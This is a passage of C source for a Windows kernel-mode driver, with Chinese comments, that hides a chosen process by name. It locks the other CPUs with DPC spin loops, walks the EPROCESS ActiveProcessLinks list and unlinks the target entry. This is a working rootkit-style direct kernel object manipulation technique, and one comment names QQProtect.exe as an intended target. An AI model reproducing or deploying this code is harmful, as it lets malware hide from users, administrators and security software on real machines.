	* 但它只能在内核中可见，为了使应用程序可见，驱动需哟啊暴露一个符号
	* 链接，该链接指向真正的设备名
	*/
	ntStatus = IoCreateSymbolicLink
	(
		&unicodeLinkString, 
		&device_String
	);
	return (ntStatus);
}


//下面这些函数用于在SMP系统上同步对Windows内核资源的访问，它们要么直接或间接在 HideProcess() 中被调用：

KIRQL  RaiseIRQL() {
	KIRQL  curr;
	KIRQL  prev;
	curr = KeGetCurrentIrql();
	if (curr < DISPATCH_LEVEL) {
		KeRaiseIrql(DISPATCH_LEVEL, &prev);
	}
	prev = curr;
	return prev;
}


PKDPC  AcquireLock() {
	PKDPC  dpcArray;
	DWORD  current_cpu;
	DWORD  i;
	DWORD  nOtherCPUs;
	if (KeGetCurrentIrql() != DISPATCH_LEVEL) {
		return  NULL;
	}
	DBG_TRACE("AcquireLock", "current cpu Executing at IRQL == DISPATCH_LEVEL");
	InterlockedAnd(&has_finished_access_os_res, 0);
	InterlockedAnd(&nCPUsLocked, 0);
	DBG_PRINT2("[AcquireLock]:  CPUs number = %u\n", KeNumberProcessors);// %u:  无符号十进制整数。

														    //此处的 ExAllocatePoolWithTag() 调用语句的参数部分需要换行书写，否则由于未知原因，会报错该函数未定义
	dpcArray = (PKDPC)ExAllocatePoolWithTag(NonPagedPool,
		KeNumberProcessors * sizeof(KDPC), 0xABCD);
	if (dpcArray == NULL) {
		return  NULL;
	}
	current_cpu = KeGetCurrentProcessorNumber();
	DBG_PRINT2("[AcquireLock]:  current_cpu = Core %u\n", current_cpu);
	for (i = 0; i < KeNumberProcessors; i++) {
		PKDPC  dpcPtr = &(dpcArray[i]);
		if (i != current_cpu) {
			KeInitializeDpc(dpcPtr, lockRoutine, NULL);
			KeSetTargetProcessorDpc(dpcPtr, i);
			KeInsertQueueDpc(dpcPtr, NULL, NULL);
		}
	}
	nOtherCPUs = KeNumberProcessors - 1;
	InterlockedCompareExchange(&nCPUsLocked, nOtherCPUs, nOtherCPUs);
	while (nCPUsLocked != nOtherCPUs) {
		__asm {
			nop;
		}
		InterlockedCompareExchange(&nCPUsLocked, nOtherCPUs, nOtherCPUs);
	}
	DBG_TRACE("AcquireLock", "All the other CPUs have been raise to DISPATCH_LEVEL and entered nop-loop, now we can call WalkProcessList() to mutex access resource");
	return  dpcArray;
}


void  lockRoutine(IN  PKDPC  dpc, IN  PVOID  context, IN  PVOID  arg1, IN  PVOID  arg2) {
	DBG_PRINT2("[lockRoutine]:   CPU[%u]  entered nop-loop", KeGetCurrentProcessorNumber());
	InterlockedIncrement(&nCPUsLocked);
	while (InterlockedCompareExchange(&has_finished_access_os_res, 1, 1) == 0) {
		__asm {
			nop;
		}
	}
	InterlockedDecrement(&nCPUsLocked);
	DBG_PRINT2("lockRoutine]:   CPU[%u]  exited nop-loop", KeGetCurrentProcessorNumber());
	return;
}


NTSTATUS  ReleaseLock(PVOID  dpc_pointer) {
	InterlockedIncrement(&has_finished_access_os_res);
	InterlockedCompareExchange(&nCPUsLocked, 0, 0);
	while (nCPUsLocked != 0) {
		__asm {
			nop;
		}
		InterlockedCompareExchange(&nCPUsLocked, 0, 0);
	}
	if (dpc_pointer != NULL) {
		ExFreePool(dpc_pointer);
	}
	DBG_TRACE("ReleaseLock", "All the other CPUs have been exited nop-loop and down to origional IRQL, and these dpc have been released");
	return STATUS_SUCCESS;
}


void  LowerIRQL(KIRQL  prev) {
	KeLowerIrql(prev);
	DBG_TRACE("LowerIRQL", "current cpu also down to origional IRQL");
	return;
}



void  HideProcessWithName(unsigned char* trg_proc_nme){

	old_irql = RaiseIRQL();
	dpcPointer = AcquireLock();
	WalkProcessListWithName(trg_proc_nme);
	ReleaseLock(dpcPointer);
	LowerIRQL(old_irql);


return;

}



void  WalkProcessListWithName(unsigned char* trg_proc_nme){


	BYTE*   currentEPROCESSpointer = NULL;
	BYTE*   nextEPROCESSpointer = NULL;
	unsigned char*  current_proc_name = NULL;
	unsigned char*  target_proc_name = NULL;

	//BYTE  processName[SZ_EPROCESS_NAME];

	int  fuse = 0;
	const  int  walkThreshold = 1048576;


	currentEPROCESSpointer = (UCHAR*)PsGetCurrentProcess();


	current_proc_name = get_proc_name(currentEPROCESSpointer);


	target_proc_name = current_proc_name;

	/*如果stricmp 系列例程精确要求比较两个以\0结尾的字符串，则需要当前把获取到的进程名复制到本地数组内，然后设置最后一个
	字符为\0，再与硬编码的\0结尾全局字符串（QQProtect.exe\0）比较*/

	//getProcessName(processName, current_proc_name);


	/*if ( stricmp(trg_proc_nme, processName) == 0 )
	{
		adjustProcessListEntryWithProcName(currentEPROCESSpointer);
		DBG_PRINT2("...........................hidding process , name =  %s..........................", current_proc_name);
		return;
	}*/

	
	if ( _stricmp(trg_proc_nme, current_proc_name) == 0 )
	{
		adjustProcessListEntryWithProcName(currentEPROCESSpointer);
		DBG_PRINT2("...........................hidding process , name =  %s..........................", current_proc_name);
		return;
	}



	nextEPROCESSpointer = getNextEPROCESSpointerForProcName(currentEPROCESSpointer);
	currentEPROCESSpointer = nextEPROCESSpointer;
	current_proc_name = get_proc_name(currentEPROCESSpointer);

// 代码执行到此处，current_proc_name：下一个进程名称
//				target_proc_name：当前进程名称
//				nextEPROCESSpointer：指向下一个进程
//				currentEPROCESSpointer：指向下一个进程
// 画出此函数的逻辑流程
// while 循环退出的条件是：target_proc_name == current_proc_name，因为前面的代码逻辑将 target_proc_name 初始化为当前执行进程的名称，
//然后保持不变，并且当前执行进程的 EPROCESS 结构作为链表头，这样 target_proc_name 就能够标识表头进程名称
//另一方面，局部变量 current_proc_name 在每一次循环的迭代中都被更新，当 current_proc_name 等于 target_proc_name 时，
//说明本次迭代到达了链表的结尾
//（结尾表项的 LIST_ENTRY.Flink 指向表头的 LIST_ENTRY.Flink），即 current_proc_name 再次被更新为表头进程的 PID 时，退出循环。



	//while ( stricmp(target_proc_name, current_proc_name) != 0 )
	while ( _stricmp(target_proc_name, current_proc_name) != 0 )
	{
		if ( _stricmp(trg_proc_nme, current_proc_name) == 0 ){
			adjustProcessListEntryWithProcName(currentEPROCESSpointer);
			DBG_PRINT2(".....................hidding process , name =  %s............................", current_proc_name);
			return;
		}

		nextEPROCESSpointer = getNextEPROCESSpointerForProcName(currentEPROCESSpointer);
		currentEPROCESSpointer = nextEPROCESSpointer;
		current_proc_name = get_proc_name(currentEPROCESSpointer);

		fuse++;

		if (fuse == walkThreshold){
			return;
		}

	}

	DBG_PRINT2(".................searched  %d  Processes, no mattch one\n...................", fuse);
	DBG_PRINT2("......................NO match Process for name =  %s\n.............................", target_hide_process_name);
	return;


}


void  adjustProcessListEntryWithProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  nextEPROCESSpointer = NULL;


	LIST_ENTRY*  currentListEntry;
	LIST_ENTRY*  prevListEntry;
	LIST_ENTRY*  nextListEntry;

	prevEPROCESSpointer = getPreviousEPROCESSpointerForProcName(currentEPROCESSpointer);
	nextEPROCESSpointer = getNextEPROCESSpointerForProcName(currentEPROCESSpointer);

//分别取得当前和相邻的 2 个 ERROCESS 的 ActiveProcessLinks 字段（一个 LIST_ENTRY 对象）

	currentListEntry = ((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	prevListEntry = ((LIST_ENTRY*)(prevEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	nextListEntry = ((LIST_ENTRY*)(nextEPROCESSpointer + EPROCESS_OFFSET_LINKS));

//分别修改三者中的特定字段（Flink 或 Blink），实现隐藏当前的 ERROCESS

//前一个 ERROCESS  的 ActiveProcessLinks.Flink 指向下一个 ERROCESS  的 ActiveProcessLinks.Flink
//下一个 ERROCESS  的 ActiveProcessLinks.Blink 指向前一个 ERROCESS  的 ActiveProcessLinks.Flink
//这就绕过了当前（中间）的 ERROCESS 的 ActiveProcessLinks
	(*prevListEntry).Flink = nextListEntry;
	(*nextListEntry).Blink = prevListEntry;

//当前 ERROCESS 的 ActiveProcessLinks.Flink 与 ActiveProcessLinks.Blink 指向 ActiveProcessLinks 自身，
//从链表中分离
	(*currentListEntry).Flink = currentListEntry;
	(*currentListEntry).Blink = currentListEntry;

	return;
}


BYTE*  getNextEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  nextEPROCESSpointer = NULL;
	BYTE*  flink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	flink = (BYTE*)(ListEntry.Flink);
	nextEPROCESSpointer = (flink - EPROCESS_OFFSET_LINKS);
	return nextEPROCESSpointer;
}



BYTE*  getPreviousEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  blink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	blink = (BYTE*)(ListEntry.Blink);
	prevEPROCESSpointer = (blink - EPROCESS_OFFSET_LINKS);
	return prevEPROCESSpointer;
}


unsigned char*  get_proc_name(BYTE*  currentEPROCESSpointer){
	
	unsigned char* proc_name;

// _EPROCESS.ImageFileName 字段就是一个 UCHAR（亦即 unsigned char）型数组，
//在 NT5.2 版内核（用于windows xp ,2003）中长度 16 字节，在 NT6.2 版内核（用于windows 7, 2008）中长度 15 字节
	proc_name = (unsigned char*)(currentEPROCESSpointer + EPROCESS_OFFSET_NAME);
	return (proc_name);
}





